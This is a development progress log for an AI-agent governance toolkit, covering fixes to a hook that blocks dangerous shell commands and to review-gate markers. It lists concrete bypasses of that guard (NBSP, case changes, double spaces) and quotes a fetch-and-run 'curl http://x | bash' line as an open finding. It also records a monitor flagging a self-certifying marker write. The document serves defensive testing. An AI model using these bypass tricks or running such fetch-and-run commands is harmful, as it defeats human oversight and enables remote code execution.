    and PowerShell's `\s` disagreed on Unicode whitespace — an NBSP (U+00A0) substituted for the space
    after "merge" bypassed the guard on bash but was still caught by PowerShell's Unicode-aware `\s`. The
    reviewer caught this only by going one step past hand-tracing 7 cases (all agreed) and actually
    executing both engines against an adversarially-chosen probe input. Fixed by normalizing tabs to
    spaces in `$cmd` up front on both sides and simplifying both boundary checks to a literal space —
    removing the character-class parity requirement entirely rather than trying to keep two different
    regex-engine whitespace classes in sync.
  - **Opposition (BLOCK, then re-reviewed to APPROVE):** the fix initially landed only in `scripts/`, never
    in `templates/scripts/` — this repo's own established "canonical adoptable surface" (per `scripts/mb.sh`'s
    `invoke_upgrade`/`TEMPLATE_OWNED` logic around line 1723, which propagates both copies) that `mb upgrade`
    copies into every adopting project. Three
    prior commits (`cb47f45`, `bd47244`, `980bc16`) had each modified both copies together, establishing
    the convention; this diff broke it, and neither of the two full domain-review rounds caught it because
    every review job is scoped to the diff, and a missing mirror update is definitionally absent from what
    got reviewed. The opposition reviewer's "what wasn't reviewed that could matter" mandate is what
    surfaced it, not deeper scrutiny of the same diff. Also caught in the same pass, "strongly
    recommended" alongside the block: an sh/ps1 case-sensitivity divergence — an uppercase-executable-name
    variant of the guarded command (a genuinely executable command on Windows: the filesystem resolves the
    exe name case-insensitively, the subcommand argument itself only needs to stay lowercase) was denied
    by PowerShell's case-insensitive regex but silently allowed by bash's case-sensitive glob. Fixed by
    case-folding both sides of `confirm_boundary()`'s comparison.
  - Both `docs/HOOKS-GUIDE.md` and `templates/docs/HOOKS-GUIDE.md` had a stale CONFIRM-tier table (still
    listing `TRUNCATE TABLE`/`DELETE FROM`, removed from the actual scripts in an unrelated earlier commit
    with nothing catching the doc going stale; never listing the new pattern) — corrected in both.
  - New `tests/dangerous-commands.Tests.ps1` (13 tests) is this hook's first-ever automated PowerShell-side
    coverage; `tests/test-dangerous-commands.sh` gained matching regression tests for every fix above (16
    assertions total per its own `Results:` output, up from 8 pre-existing).
  - Re-review (Opposition #2) independently re-ran both test suites and a 26-case sh-vs-ps1 parity
    harness itself, confirmed zero divergence remaining on any git-merge-shaped input, and surfaced 4 more
    non-blocking findings for later: **F1 (High, VERIFIED but confirmed pre-existing via `git show HEAD`,
    not introduced by this diff)** — `curl http://x |  bash` (two spaces) bypasses the BLOCK tier on bash
    but not PowerShell, same defect *class* as the fixes above, living in different, untouched lines; F2
    (Low) — `docs/HOOKS-GUIDE.md` says "BLOCK (19 patterns)" but lists 18, pre-existing; F3 (Info) — the
    guard is broader than `SECURITY-GUARDRAILS.md:114`'s literal scope (any `git merge`, not just
    onto-a-branch-with-a-remote-or-PR), stricter direction, not a problem; F4 (Medium) — a few unrealistic
    `git merge` forms (mid-line via `;`/newline, double-spaced) still slip through, but consistently on
    both platforms, and the realistic/documented shape is caught. None fixed this round — F1 is real but
    genuinely out of this diff's scope; logged as a new backlog item rather than expanding Task #30.
- 🔴 **Live-reproduced the still-pending "marker-destruction-on-denial" bug** (already tracked, not
  previously seen fire for real in this session). Sequence: Opposition round 2 approved and wrote
  `.claude/.code-review-ok` (hash `f493d346ac2c...`, independently re-verified matching by direct
  recomputation). The following `git commit` attempt was DENIED by `dangerous-commands.sh` — the commit
  message itself quoted the guarded phrase as a literal example ("GIT merge main"), which the very guard
  just approved correctly caught. That denial had a side effect: `.claude/.code-review-ok` was gone
  afterward even though the commit never ran and the working tree never changed — `review-reminders.sh`'s
  marker-consuming logic fired despite the `PreToolUse` denial. Resolved by resuming the *same* Opposition
  agent (not a fresh self-review) to confirm the working tree was still byte-identical to what it had
  already reviewed, then re-write the marker via the standard command — reproduced the identical hash,
  independently reconfirmed a third time. A harness-level security monitor flagged that marker-write as a
  possible self-certification pattern; walked the user through the verification evidence directly (three
  independent hash computations agreeing, no content change) before committing. This is now a concrete,
  reproducible incident to work from when Task #33 (documented below) is actually fixed, rather than a
  theoretical description.
- 📌 **Work-MB findings doc** (`C:\Users\Mizzo\Downloads\PMB-Findings-for-Work-MB.md`) — added **Document
  8** covering the two findings above (templates/ mirror gap missed by diff-scoped review; the "parity"
  comment that was wrong twice, only caught by direct adversarial execution not hand-tracing) plus a third
  part checking this project's own global-CLI-install path for the same staleness-gap *class* a sibling
  project's tooling had just been found to have (npm-link vs. stale-registry-copy) — verified clean: the
  global `mb` command is a thin wrapper reading `MB_HOME` and invoking `scripts/mb.ps1` directly from the
  live repo path, no intermediate copy, no publish step, structurally the safe pattern.
- Remaining from the original `/change-review` pass's findings, not yet started: 3 test-coverage gaps
  (version-notifier quote-stripping, `mb clean` weak assertion, PowerShell parity for the chained-cd fix);
  the marker-destruction-on-denial fix itself; atomic version-cache write + `diff_hash()` trap-scoping;
  final full test-suite run + re-run `/change-review` + push/merge PR #8.

## 2026-08-12 — Fleet Version Drift Incident (reported, not yet fixed)

- 📌 Cross-session report from `ai-code-review-agent`: that repo drifted to `.pmb-version: 1.1.1`
  against PMB's `1.2.1`+unreleased, missing `_review-gate-lib.ps1`, `Resolve-CdRoot`, and the
  `gh pr merge` deny in its `review-reminders.ps1` — ran a 13-task feature under stale governance
  hooks before it was caught. `mb doctor`'s existing version-mismatch WARN existed the whole time
  and wasn't what surfaced it. Full detail: `activeContext.md`'s 2026-08-12 entry, `[NS-14]`.
- 📌 Not independently re-verified from this session (separate repo, cross-repo write boundary).
  Not yet fixed — ACR hasn't run the real `mb upgrade` yet, blocked on that session's own user
  go-ahead.
- 📌 User separately flagged that `mb upgrade`/`mb init` staleness detection "should not just look
  at date" — resolved as not-actually-open: `TEMPLATE_OWNED` sync is already unconditional; the real
  gap is nothing triggers a run.

## Earlier Work (2026-07-02 through 2026-08-10) — condensed, full detail archived

- **2026-07-16 through 2026-08-05 — Review-gate mechanism evolution**: self-attestation fix (marker-write
  moved into the last dispatched review subagent), a false-positive fix in `review-reminders.sh`'s
  command matching, the confirm-step redesign (durable `docs/review-log/` + user-confirmed marker write),
  a worktree-root-resolution fix (closed a real denial-from-inside-a-worktree bug), a hook-lib dedup
  (`_review-gate-lib.sh`/`.ps1`), and the confirm-step's first live whole-branch review (found and fixed
  one real Blocking finding). Full detail: `docs/archive/progress-2026-07-review-gate-evolution.md`.
- **2026-07-02 through 2026-07-13 — Repo governance, CI hardening, branch protection**: `mb upgrade`
  slash-command auto-discovery fixes, 4 pre-existing CI failures closed (SAST config, 2 false-positive
  greps, PowerShell lint), CI hardening across 3 downstream repos, branch protection rolled out to 5
  public repos, a real hash byte-mismatch bug fixed (bash vs. PowerShell diverged on trailing-newline
  handling), the cross-repo write boundary hook built after a real incident (this session wrote into
  another repo's working directory without checking ownership), and the review-flow fleet audit (found
  real enforcement in only 2 of 11 repos). Full detail:
  `docs/archive/progress-2026-07-repo-governance-and-ci.md`.
- **2026-07-14, 2026-07-23 — `mb backlog` Task 1 + mb update-notifier**: `mb backlog`'s Task 1 shipped
  with two real Critical/High security bugs found and fixed (path traversal, sed-delimiter injection);
  Tasks 2-5 not started (`[NS-0]`). The update-notifier shipped clean, but the same session produced an
  authorization-drift incident (a "what do you suggest" non-answer treated as merge approval) that
  produced the "What Counts as Approval" rule. Full detail:
  `docs/archive/progress-2026-07-mb-backlog-and-notifier.md`.
- **2026-08-08, 2026-08-10 — Concurrent session claims + memory-bank freshness hook**: session-claims
  shipped (13 tasks + 5 post-review fixes, including one found only by a final whole-branch review after
  every individual task had already passed its own two-stage review); the freshness-hook spec was
  designed and committed but not yet implemented (`[NS-13]`). Full detail:
  `docs/archive/progress-2026-08-freshness-and-session-claims.md`.

## Status: Ready

Personal fork of the enterprise Memory Bank standard — lifecycle management and provenance tracking implemented.

## What's In This Fork

- ✅ Memory Bank system (5-file + handoff protocol) + authority hierarchy + 3-dimension frontmatter
- ✅ Provenance frontmatter: compaction_generation, source_type, confidence, lineage
- ✅ Security Guardrails (BLOCK/CONFIRM/WARN) + 9-rule registry (SECURITY-RULES.md) + 9 security fixtures
- ✅ Code Quality, Logging, 7-phase Workflow standards; Supply Chain, MCP Security, Rules-File Integrity (reference)
- ✅ Slash commands: /pmb-status, /code-review, /feature-dev, /security-review, /test-audit, /health-check, /mb-drift, /change-review
- ✅ mb CLI: init, status, doctor (25 checks), query, clean, commit, upgrade, verify-integrity, plan (status/list/promote/archive) + deprecated aliases
- ✅ Hook suite: dangerous-commands blocker, contract scope check, delegation depth check, auto-last-reviewed, PreCompact memory gate, review gate
- ✅ Versioned git hooks via core.hooksPath (.githooks/pre-push + pre-commit), distributed by mb upgrade (TEMPLATE_OWNED)
- ✅ mb upgrade: TEMPLATE_OWNED/ADVISORY_DIFF/ADVISORY_CREATE distribution model; remote version check
- ✅ CI: template-integrity job + SAST (Semgrep p/bash); CLAUDE_AUTOCOMPACT_PCT_OVERRIDE=40
- ✅ install.bat / install.sh, examples/task-tracker-api, VERSION, CHANGELOG.md, docs/COMMANDS-REFERENCE.md
- ✅ Cursor rules (5 rules + code-review rule)

Full history: CHANGELOG.md

## Removed vs Enterprise

- ❌ Eric Nolan branding and brand assets
- ❌ Data Classification, Model Governance, OWASP LLM Top 10 (compliance only)
- ❌ Incident Runbook, accessibility review command
- ❌ Enterprise logging (PII redaction, correlation IDs)
- ❌ Team onboarding scripts and training materials

## Backlog

**Deferred pending operational evidence:**
- ⏸ handoff CLI, pinned.md, mb update --from-git, mb privacy

## Earlier Sessions (2026-06-19 to 2026-06-24) — condensed, full detail in CHANGELOG.md

- ✅ **06-19:** Semantic drift checks 21-23 added to `mb doctor`; `/mb-drift` skill created; startup context trimmed to below 25 KB.
- ✅ **06-22:** `docs/plans/` + `.claude/plans/` workflow scaffolded; `mb plan status|list|promote|archive`; doctor check 24 (plan hygiene); `/change-review` command created (9-job review + ACR bridge).
- ✅ **06-24 Audit Sprint:** Bug fixes (settings.json JSON, pre-compact false positives, TRUNCATE/DELETE guardrails); 8 new test files (115 assertions); CI hardened to 9 jobs (PSScriptAnalyzer, mb-doctor-self-check); perf fixes (O(n²) pre-cache); ACR P0/P1/P2 (comment markers, SARIF, GitHub annotations, schemaVersion).

## Satellite Projects

- **ai-code-review-agent** — `unyieldingclaw-dev/ai-code-review-agent`. v1.1.0: 15 observe-only agents, profiles, --context memory-bank, SARIF, GitHub annotations, agentPolicy, integration contract. 276 tests passing.
